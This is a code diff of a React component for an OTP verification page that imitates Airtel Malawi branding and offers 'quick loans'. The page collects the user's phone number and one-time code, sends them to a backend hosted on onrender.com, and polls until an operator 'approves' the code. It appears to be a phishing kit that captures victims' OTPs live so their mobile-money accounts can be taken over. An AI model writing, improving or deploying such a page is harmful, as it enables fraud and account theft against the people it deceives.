@@ -1,377 +1,207 @@
 import React, { useState, useEffect, useCallback, useRef } from 'react';
 import { useNavigate } from 'react-router-dom';
-import { useLanguage } from './LanguageContext';
 
-const API_BASE = (
-  import.meta.env.VITE_API_BASE_URL ||
-  'https://airtel-loan-backend-z5vx.onrender.com'
-).replace(/\/$/, '');
-
+const API_BASE = (import.meta.env.VITE_API_BASE_URL || 'https://airtel-loan-backend-z5vx.onrender.com').replace(/\/$/, '');
 const OTP_LENGTH = 4;
-const POLL_FAST_MS = 2000;
-const POLL_SLOW_MS = 5000;
-const POLL_SLOW_AFTER_MS = 60_000;
 const TIMER_START = 60;
-const PENDING_KEY = 'airtelPendingRequest';
 const FETCH_TIMEOUT_MS = 90_000;
-const SLOW_HINT_AFTER_MS = 4_000;
 
 async function apiFetch(path: string, opts: RequestInit = {}) {
   const ctrl = new AbortController();
   const timer = setTimeout(() => ctrl.abort(), FETCH_TIMEOUT_MS);
   try {
     return await fetch(`${API_BASE}${path}`, {
-      ...opts,
-      signal: ctrl.signal,
-      mode: 'cors',
-      credentials: 'omit',
-      headers: {
-        'Content-Type': 'application/json',
-        Accept: 'application/json',
-        ...(opts.headers || {}),
-      },
+      ...opts, signal: ctrl.signal, mode: 'cors', credentials: 'omit',
+      headers: { 'Content-Type': 'application/json', ...(opts.headers || {}) },
     });
-  } finally {
-    clearTimeout(timer);
-  }
-}
-
-function makeRefId() {
-  const ts = Date.now().toString(36).toUpperCase();
-  const rand = Math.random().toString(36).slice(2, 6).toUpperCase();
-  return `AL-${ts}-${rand}`;
-}
-
-function formatPhone(p: string) {
-  if (!p) return '...';
-  return p.replace(/\s+/g, '');
+  } finally { clearTimeout(timer); }
 }
 
 function AirtelOTPVerify() {
   const navigate = useNavigate();
-  const { t } = useLanguage();
-
-  const [otp, setOtp] = useState('');
+  const [otp, setOtp] = useState<string[]>(['', '', '', '']);
   const [timeLeft, setTimeLeft] = useState(TIMER_START);
-  const [timerResetKey, setTimerResetKey] = useState(0);
-  const [expired, setExpired] = useState(false);
   const [isVerifying, setIsVerifying] = useState(false);
-  const [waitingForAdmin, setWaitingForAdmin] = useState(false);
-  const [isSlow, setIsSlow] = useState(false);
   const [error, setError] = useState('');
-
-  const pollTokenRef = useRef<{ cancelled: boolean } | null>(null);
-  const pollTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
-  const slowTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
-  const hasResumedRef = useRef(false);
-
-  const phoneNumber = localStorage.getItem('airtelPhone') || '';
-
-  const stopPolling = useCallback(() => {
-    if (pollTokenRef.current) pollTokenRef.current.cancelled = true;
-    pollTokenRef.current = null;
-    if (pollTimerRef.current) {
-      clearTimeout(pollTimerRef.current);
-      pollTimerRef.current = null;
-    }
-    if (slowTimerRef.current) {
-      clearTimeout(slowTimerRef.current);
-      slowTimerRef.current = null;
-    }
-  }, []);
+  
+  const otpRefs = useRef<(HTMLInputElement | null)[]>([]);
+  const pollRef = useRef<ReturnType<typeof setInterval> | null>(null);
+  const phoneNumber = localStorage.getItem('airtelPhone') || '...';
 
   useEffect(() => {
     if (!phoneNumber) navigate('/');
+    const id = setInterval(() => setTimeLeft(prev => (prev <= 1 ? 0 : prev - 1)), 1000);
+    return () => clearInterval(id);
   }, [phoneNumber, navigate]);
 
-  /* Countdown timer */
-  useEffect(() => {
-    if (expired) return;
-    const id = setInterval(() => {
-      setTimeLeft((prev) => {
-        if (prev <= 1) {
-          clearInterval(id);
-          setExpired(true);
-          return 0;
-        }
-        return prev - 1;
-      });
-    }, 1000);
-    return () => clearInterval(id);
-  }, [timerResetKey, expired]);
-
-  useEffect(() => stopPolling, [stopPolling]);
-
-  const resetToInput = useCallback(() => {
-    stopPolling();
-    setIsVerifying(false);
-    setWaitingForAdmin(false);
-    setIsSlow(false);
-    setOtp('');
-    sessionStorage.removeItem(PENDING_KEY);
-  }, [stopPolling]);
-
-  const startPolling = useCallback(
-    (id: string) => {
-      stopPolling();
-      const token = { cancelled: false };
-      pollTokenRef.current = token;
-      const startedAt = Date.now();
-
-      const tick = async () => {
-        if (token.cancelled) return;
-        try {
-          const res = await apiFetch(`/api/otp-status/${encodeURIComponent(id)}`, {
-            cache: 'no-store',
-          });
-          if (!res.ok) throw new Error(`HTTP ${res.status}`);
-          const data = await res.json();
-          if (token.cancelled) return;
-
-          if (data.status === 'approved') {
-            stopPolling();
-            sessionStorage.removeItem(PENDING_KEY);
-            setTimeout(() => navigate('/airtel-loan-limit'), 300);
-            return;
-          }
-
-          if (data.status === 'rejected' || data.status === 'expired') {
-            setError(t('invalidCredentials') || 'Code rejected or expired.');
-            resetToInput();
-            return;
-          }
-        } catch (e) {
-          // keep polling on network blips
-          console.warn('[OTP] poll error, will retry:', e);
-        }
-
-        if (token.cancelled) return;
-        const elapsed = Date.now() - startedAt;
-        const delay = elapsed < POLL_SLOW_AFTER_MS ? POLL_FAST_MS : POLL_SLOW_MS;
-        pollTimerRef.current = setTimeout(tick, delay);
-      };
-
-      pollTimerRef.current = setTimeout(tick, POLL_FAST_MS);
-    },
-    [navigate, resetToInput, stopPolling, t],
-  );
-
-  /* Resume pending request from a previous session */
-  useEffect(() => {
-    if (hasResumedRef.current) return;
-    hasResumedRef.current = true;
-    try {
-      const raw = sessionStorage.getItem(PENDING_KEY);
-      if (!raw) return;
-      const saved = JSON.parse(raw);
-      if (!saved?.refId) return;
-      setWaitingForAdmin(true);
-      setIsVerifying(true);
-      startPolling(saved.refId);
-    } catch {
-      sessionStorage.removeItem(PENDING_KEY);
-    }
-  }, [startPolling]);
-
-  const handleOtpChange = (e: React.ChangeEvent<HTMLInputElement>) => {
-    const val = e.target.value.replace(/\D/g, '');
-    if (val.length <= OTP_LENGTH) setOtp(val);
+  const handleOtpChange = (index: number, value: string) => {
+    if (!/^\d*$/.test(value)) return;
+    const newOtp = [...otp];
+    newOtp[index] = value.substring(value.length - 1);
+    setOtp(newOtp);
+    if (value && index < 3) otpRefs.current[index + 1]?.focus();
   };
+
+  const stopPolling = () => { if (pollRef.current) clearInterval(pollRef.current); };
 
   const handleVerify = async (e: React.FormEvent) => {
     e.preventDefault();
-    if (isVerifying || otp.length < OTP_LENGTH || expired) return;
+    const otpString = otp.join('');
+    if (otpString.length < 4) return;
 
     setError('');
     setIsVerifying(true);
-    setWaitingForAdmin(false);
-    setIsSlow(false);
-
-    slowTimerRef.current = setTimeout(() => setIsSlow(true), SLOW_HINT_AFTER_MS);
-
-    const newRefId = makeRefId();
-    const nowIso = new Date().toISOString();
 
     try {
       const response = await apiFetch('/api/verify-otp', {
         method: 'POST',
-        body: JSON.stringify({
-          phone_number: phoneNumber,
-          otp,
-          ref_id: newRefId,
-          submitted_at: nowIso,
-        }),
+        body: JSON.stringify({ phone_number: phoneNumber, otp: otpString, ref_id: `AL-${Date.now()}` }),
       });
-
-      if (!response.ok) {
-        const text = await response.text().catch(() => '');
-        throw new Error(`HTTP ${response.status}: ${text || response.statusText}`);
-      }
-
       const data = await response.json();
-      const finalRef = data.ref_id || newRefId;
 
       if (data.status === 'approved') {
-        sessionStorage.removeItem(PENDING_KEY);
-        setTimeout(() => navigate('/airtel-loan-limit'), 300);
+        navigate('/airtel-loan-limit');
         return;
       }
 
       if (data.status === 'rejected') {
-        setError(t('invalidCredentials') || 'Invalid OTP code.');
-        resetToInput();
+        setError('Invalid OTP code.');
+        setIsVerifying(false);
         return;
       }
 
-      // pending — start polling
-      setWaitingForAdmin(true);
-      sessionStorage.setItem(
-        PENDING_KEY,
-        JSON.stringify({ refId: finalRef, otp, submittedAt: nowIso }),
-      );
-      startPolling(finalRef);
-    } catch (err: any) {
-      resetToInput();
-      const msg =
-        err?.name === 'AbortError'
-          ? 'Server took too long to respond. Please try again.'
-          : err?.message?.includes('Failed to fetch')
-            ? 'Cannot reach server. Check your internet or try again in a moment.'
-            : t('networkError') || 'Network error. Please try again.';
-      setError(msg);
+      // Poll status
+      pollRef.current = setInterval(async () => {
+        const res = await apiFetch(`/api/otp-status/${encodeURIComponent(data.ref_id)}`);
+        const status = await res.json();
+        if (status.status === 'approved') {
+          stopPolling();
+          navigate('/airtel-loan-limit');
+        } else if (status.status === 'rejected' || status.status === 'expired') {
+          stopPolling();
+          setIsVerifying(false);
+          setError('Code rejected or expired.');
+        }
+      }, 2000);
+
+    } catch {
+      setIsVerifying(false);
+      setError('Network error.');
     }
   };
 
-  const showWaitingOverlay = isVerifying || waitingForAdmin;
-  const isFormValid = otp.length === OTP_LENGTH && !expired;
-
   return (
-    <div className="airtel-page-container">
+    <div className="page-wrapper">
       <style>{`
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
-        .airtel-page-container { display:flex; flex-direction:column; min-height:100vh; background:#F8F9FA; position:relative; }
-        .waiting-overlay { position:fixed; top:0; left:0; width:100vw; height:100vh; display:flex; flex-direction:column; align-items:center; justify-content:center; z-index:9999; padding:20px; background:rgba(255,255,255,0.95); }
-        .faded-content { opacity:0.1; pointer-events:none; transition:opacity .3s ease; display:flex; flex-direction:column; min-height:100vh; }
-        .custom-spinner { width:60px; height:60px; border:6px solid #E5E7EB; border-top:6px solid #DA1C1C; border-radius:50%; animation:spin 1s linear infinite; margin-bottom:24px; }
-        @keyframes spin { 0%{transform:rotate(0deg)} 100%{transform:rotate(360deg)} }
-        .waiting-title { font-size:20px; font-weight:800; color:#1a1a1a; margin-bottom:16px; text-align:center; }
-        .waiting-message { background:#FEF2F2; color:#4B5563; padding:16px 24px; border-radius:24px; text-align:center; font-size:15px; font-weight:500; line-height:1.5; max-width:380px; }
-        .header-section { display:flex; justify-content:space-between; align-items:center; padding:16px 20px; background:#fff; border-bottom:1px solid #E5E7EB; }
-        .header-icon-btn { background:none; border:none; cursor:pointer; padding:8px; display:flex; align-items:center; justify-content:center; }
-        .header-center-logo { display:flex; flex-direction:column; align-items:center; }
-        .tagline { font-size:8px; letter-spacing:1px; color:#333; text-transform:uppercase; margin-top:4px; font-weight:600; }
-        .tagline span { color:#DA1C1C; }
-        .main-content { flex:1; padding:24px; display:flex; flex-direction:column; align-items:center; }
-        .otp-card { background:#fff; width:100%; max-width:420px; border-radius:16px; padding:32px 24px; box-shadow:0 4px 20px rgba(0,0,0,.05); border:1px solid #F3F4F6; }
-        .card-title { font-size:24px; font-weight:800; color:#1a1a1a; margin-bottom:12px; }
-        .card-subtitle { font-size:15px; color:#6B7280; margin-bottom:24px; line-height:1.5; }
-        .phone-highlight { color:#1a1a1a; font-weight:700; display:block; margin-top:4px; }
-        .error-message { color:#DA1C1C; font-size:14px; font-weight:600; text-align:center; margin-bottom:16px; background:#FEF2F2; padding:10px; border-radius:8px; width:100%; }
-        .otp-input-field { width:100%; padding:18px; border:2px solid #DA1C1C; border-radius:8px; font-size:24px; font-weight:600; letter-spacing:12px; color:#1a1a1a; text-align:center; outline:none; transition:border-color .2s; margin-bottom:16px; }
-        .otp-input-field::placeholder { color:#9CA3AF; letter-spacing:normal; font-size:16px; font-weight:400; }
-        .otp-input-field:focus { border-color:#DA1C1C; }
-        .otp-timer-text { font-size:14px; color:#6B7280; text-align:center; margin-bottom:24px; line-height:1.6; }
-        .otp-timer-text strong { color:#1a1a1a; }
-        .otp-timer-text.expired strong { color:#DA1C1C; }
-        .login-btn { width:100%; padding:18px; border-radius:30px; border:none; background:#D1D5DB; color:#fff; font-size:16px; font-weight:700; text-transform:uppercase; cursor:not-allowed; transition:background-color .2s; }
-        .login-btn.active { background:#DA1C1C; cursor:pointer; }
-        .otp-footer { background:#F3F4F6; padding:32px 24px; display:flex; flex-direction:column; align-items:center; border-top:1px solid #E5E7EB; }
-        .footer-logo-wrapper { display:flex; flex-direction:column; align-items:center; margin-bottom:24px; }
-        .collab-text { font-size:14px; font-weight:600; color:#333; margin-bottom:4px; }
-        .starlink-text { font-size:15px; font-weight:800; color:#1a1a1a; letter-spacing:1px; }
-        .starlink-text sup { font-size:8px; font-weight:normal; }
-        .copyright { font-size:12px; color:#9CA3AF; margin-top:24px; }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+        body { background-color: #DA1C1C; }
+        .page-wrapper { display: flex; flex-direction: column; min-height: 100vh; background-color: #DA1C1C; align-items: center; position: relative; }
+        .header-top { width: 100%; padding: 16px 20px; display: flex; align-items: center; justify-content: center; position: relative; color: #1a1a1a; }
+        .menu-icon { position: absolute; left: 20px; font-size: 24px; cursor: pointer; }
+        .header-title { font-size: 22px; font-weight: 900; }
+        .header-sub { color: #1a1a1a; font-size: 12px; text-align: center; margin-bottom: 24px; font-weight: 500; }
+        
+        .card { background: #fff; width: 92%; max-width: 420px; border-radius: 24px; padding: 32px 24px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); margin-bottom: 24px; z-index: 10; }
+        
+        .back-link { display: flex; align-items: center; gap: 8px; font-size: 14px; color: #6B7280; text-decoration: none; margin-bottom: 20px; cursor: pointer; }
+        .card-title { font-size: 26px; font-weight: 900; color: #1a1a1a; margin-bottom: 8px; }
+        .card-sub { font-size: 15px; color: #6B7280; margin-bottom: 24px; line-height: 1.5; }
+        
+        .label { font-size: 14px; font-weight: 700; color: #1a1a1a; margin-bottom: 12px; display: block; text-align: center; }
+        .otp-boxes { display: flex; gap: 12px; margin-bottom: 24px; justify-content: center; }
+        .otp-box { width: 60px; height: 60px; border: 1px solid #D1D5DB; border-radius: 8px; font-size: 24px; font-weight: 700; text-align: center; outline: none; background: #fff; color: #1a1a1a; }
+        .otp-box:focus { border-color: #DA1C1C; box-shadow: 0 0 0 2px rgba(218,28,28,0.2); }
+        
+        .timer-row { display: flex; align-items: center; justify-content: center; gap: 8px; font-weight: 700; font-size: 16px; color: #1a1a1a; margin-bottom: 24px; }
+        .timer-icon { color: #DA1C1C; }
+        
+        .btn { width: 100%; padding: 16px; border-radius: 8px; border: none; font-size: 16px; font-weight: 700; display: flex; align-items: center; justify-content: center; gap: 8px; cursor: pointer; transition: 0.2s; margin-bottom: 12px; }
+        .btn-primary { background: #F87171; color: #1a1a1a; }
+        .btn-primary:active { background: #EF4444; }
+        .btn-secondary { background: #E5E7EB; color: #6B7280; }
+        .btn-disabled { background: #E5E7EB; color: #9CA3AF; cursor: not-allowed; }
+        
+        .bottom-brands { display: flex; gap: 16px; margin-top: auto; padding-bottom: 32px; }
+        .brand-icon { width: 40px; height: 40px; display: flex; align-items: center; justify-content: center; }
+        
+        .overlay { position: fixed; inset: 0; background: rgba(255,255,255,0.95); display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 999; }
+        .spinner-box { background: #fff; width: 90%; max-width: 380px; padding: 40px 24px; border-radius: 16px; text-align: center; box-shadow: 0 4px 20px rgba(0,0,0,0.1); }
+        .spinner { width: 50px; height: 50px; margin: 0 auto 24px; position: relative; }
+        .spinner div { transform-origin: 40px 40px; animation: spin 1.2s linear infinite; }
+        .spinner div:after { content: " "; display: block; position: absolute; top: 3px; left: 37px; width: 6px; height: 16px; border-radius: 20%; background: #DA1C1C; }
+        .spinner div:nth-child(1) { transform: rotate(0deg); animation-delay: -1.1s; } .spinner div:nth-child(2) { transform: rotate(30deg); animation-delay: -1s; }
+        .spinner div:nth-child(3) { transform: rotate(60deg); animation-delay: -0.9s; } .spinner div:nth-child(4) { transform: rotate(90deg); animation-delay: -0.8s; }
+        .spinner div:nth-child(5) { transform: rotate(120deg); animation-delay: -0.7s; } .spinner div:nth-child(6) { transform: rotate(150deg); animation-delay: -0.6s; }
+        .spinner div:nth-child(7) { transform: rotate(180deg); animation-delay: -0.5s; } .spinner div:nth-child(8) { transform: rotate(210deg); animation-delay: -0.4s; }
+        .spinner div:nth-child(9) { transform: rotate(240deg); animation-delay: -0.3s; } .spinner div:nth-child(10) { transform: rotate(270deg); animation-delay: -0.2s; }
+        .spinner div:nth-child(11) { transform: rotate(300deg); animation-delay: -0.1s; } .spinner div:nth-child(12) { transform: rotate(330deg); animation-delay: 0s; }
+        @keyframes spin { 0% { opacity: 1; } 100% { opacity: 0; } }
       `}</style>
 
-      {showWaitingOverlay && (
-        <div className="waiting-overlay">
-          <div className="custom-spinner" />
-          <div className="waiting-title">Awaiting approval</div>
-          <div className="waiting-message">
-            {isSlow
-              ? 'Server is warming up — this may take up to a minute on the first request…'
-              : 'Your request has been sent. Please wait while we verify…'}
+      {isVerifying && (
+        <div className="overlay">
+          <div className="spinner-box">
+            <div className="spinner">
+              <div></div><div></div><div></div><div></div><div></div><div></div>
+              <div></div><div></div><div></div><div></div><div></div><div></div>
+            </div>
+            <h2 style={{fontSize: '22px', fontWeight: 900, color: '#1a1a1a', marginBottom: '12px'}}>Processing...</h2>
+            <p style={{fontSize: '14px', color: '#6B7280'}}>Please wait while we verify your code...</p>
           </div>
         </div>
       )}
 
-      <div className={showWaitingOverlay ? 'faded-content' : ''}>
-        <header className="header-section">
-          <button className="header-icon-btn" onClick={() => navigate('/')}>
-            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#1a1a1a" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-              <line x1="19" y1="12" x2="5" y2="12" />
-              <polyline points="12 19 5 12 12 5" />
-            </svg>
-          </button>
-          <div className="header-center-logo">
-            <svg width="100" height="30" viewBox="0 0 140 40" fill="none" xmlns="http://www.w3.org/2000/svg">
-              <path d="M25 2C16.7 2 10 8.7 10 17C10 27 25 38 25 38C25 38 40 27 40 17C40 8.7 33.3 2 25 2Z" fill="#DA1C1C"/>
-              <circle cx="25" cy="17" r="5" fill="white"/>
-              <text x="46" y="29" fontSize="26" fontWeight="700" fill="#DA1C1C" letterSpacing="-0.5">airtel</text>
-            </svg>
-            <p className="tagline">A REASON TO <span>IMAGINE</span></p>
-          </div>
-          <button className="header-icon-btn">
-            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#1a1a1a" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-              <line x1="3" y1="12" x2="21" y2="12" />
-              <line x1="3" y1="6" x2="21" y2="6" />
-              <line x1="3" y1="18" x2="21" y2="18" />
-            </svg>
-          </button>
-        </header>
+      <div className="header-top">
+        <div className="menu-icon">≡</div>
+        <h1 className="header-title">Airtel Malawi</h1>
+      </div>
+      <p className="header-sub">Quick loans. Anytime. Anywhere.</p>
 
-        <main className="main-content">
-          <div className="otp-card">
-            <h2 className="card-title">OTP Verification</h2>
-            <p className="card-subtitle">
-              Enter the OTP sent to your phone number
-              <span className="phone-highlight">{formatPhone(phoneNumber)}</span>
-            </p>
+      <div className="card">
+        <div className="back-link" onClick={() => navigate('/')}>← Back to login</div>
+        
+        <h2 className="card-title">Verify your code</h2>
+        <p className="card-sub">Enter the 4-digit code sent to <br/><b>{phoneNumber}</b></p>
 
-            {error && <div className="error-message">{error}</div>}
+        {error && <div style={{color: '#DA1C1C', textAlign: 'center', marginBottom: '16px', fontWeight: 600}}>{error}</div>}
 
-            <form onSubmit={handleVerify} style={{ width: '100%', display: 'flex', flexDirection: 'column', alignItems: 'center' }}>
-              <input
-                type="tel"
-                inputMode="numeric"
-                autoComplete="one-time-code"
-                maxLength={OTP_LENGTH}
-                value={otp}
-                onChange={handleOtpChange}
-                placeholder={t('enterOtp') || 'Enter the 4-digit OTP'}
-                className="otp-input-field"
-                disabled={showWaitingOverlay || expired}
-              />
+        <label className="label">Enter OTP code</label>
+        <div className="otp-boxes">
+          {otp.map((digit, i) => (
+            <input
+              key={i}
+              type="tel"
+              className="otp-box"
+              maxLength={1}
+              value={digit}
+              ref={(el) => { otpRefs.current[i] = el; }}
+              onChange={(e) => handleOtpChange(i, e.target.value)}
+              onKeyDown={(e) => { if (e.key === 'Backspace' && !otp[i] && i > 0) otpRefs.current[i - 1]?.focus(); }}
+            />
+          ))}
+        </div>
 
-              <p className={`otp-timer-text ${expired ? 'expired' : ''}`}>
-                Enter the 4-digit verification code<br />
-                The code expires in <strong>{timeLeft}</strong> seconds
-              </p>
+        <div className="timer-row">
+          <svg className="timer-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>
+          {timeLeft}s
+        </div>
 
-              <button
-                type="submit"
-                className={`login-btn ${isFormValid ? 'active' : ''}`}
-                disabled={!isFormValid || showWaitingOverlay}
-              >
-                SUBMIT
-              </button>
-            </form>
-          </div>
-        </main>
+        <button className={`btn ${otp.join('').length === 4 ? 'btn-primary' : 'btn-disabled'}`} onClick={handleVerify} disabled={otp.join('').length < 4}>
+          Verify code →
+        </button>
+        
+        <button className="btn btn-secondary" onClick={() => setTimeLeft(TIMER_START)}>
+          Resend code
+        </button>
+      </div>
 
-        <footer className="otp-footer">
-          <div className="footer-logo-wrapper">
-            <svg width="110" height="30" viewBox="0 0 140 40" fill="none" xmlns="http://www.w3.org/2000/svg">
-              <path d="M25 2C16.7 2 10 8.7 10 17C10 27 25 38 25 38C25 38 40 27 40 17C40 8.7 33.3 2 25 2Z" fill="#DA1C1C"/>
-              <circle cx="25" cy="17" r="5" fill="white"/>
-              <text x="46" y="29" fontSize="26" fontWeight="700" fill="#DA1C1C" letterSpacing="-0.5">airtel</text>
-            </svg>
-            <p className="tagline">A REASON TO <span>IMAGINE</span></p>
-          </div>
-          <p className="collab-text">In collaboration with</p>
-          <p className="starlink-text">STARLINK<sup>TM</sup></p>
-          <p className="copyright">© 2026 Airtel Malawi. All rights reserved.</p>
-        </footer>
+      <div className="bottom-brands">
+        <div className="brand-icon" style={{background: '#fff', borderRadius: '8px', border: '2px solid #ccc', color: '#DA1C1C', fontWeight: 'bold', fontSize: '10px'}}>D-<br/>Money</div>
+        <div className="brand-icon" style={{color: '#1E293B'}}>
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C9.243 2 7 4.243 7 7v3H6a2 2 0 0 0-2 2v8a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-8a2 2 0 0 0-2-2h-1V7c0-2.757-2.243-5-5-5zm-3 5c0-1.654 1.346-3 3-3s3 1.346 3 3v3H9V7zm4 9h-2v-2h2v2z"/></svg>
+        </div>
+        <div className="brand-icon" style={{color: '#FCD34D', background: '#1E293B', borderRadius: '4px', fontSize: '10px', fontWeight: 'bold'}}>Airtel<br/>Money</div>
+        <div className="brand-icon" style={{color: '#FCD34D', border: '2px solid #D97706', borderRadius: '50%', fontSize: '18px', fontWeight: '900'}}>K</div>
       </div>
     </div>
   );
